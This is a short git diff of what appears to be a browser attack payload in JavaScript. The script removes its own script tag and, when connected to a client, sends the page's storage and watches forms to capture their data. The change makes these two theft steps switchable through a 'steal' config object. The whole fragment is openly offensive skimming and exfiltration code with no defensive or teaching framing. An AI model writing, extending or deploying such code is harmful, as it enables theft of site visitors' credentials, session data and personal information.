@@ -2,7 +2,7 @@ import {Client} from '2sweet'
 import removeCurrentScript from '@functions/removeCurrentScript'
 import sendStorage from './sendStorage'
 import watchForms from './watchForms'
-import {stealData} from '@config'
+import {steal} from '@config'
 
 removeCurrentScript()
 
@@ -22,6 +22,6 @@ function pagePayload() {
 }
 
 function onConnect(client) {
-  sendStorage(client)
-  watchForms(client)
+  if (steal.storage === true) sendStorage(client)
+  if (steal.formData === true) watchForms(client)
 }
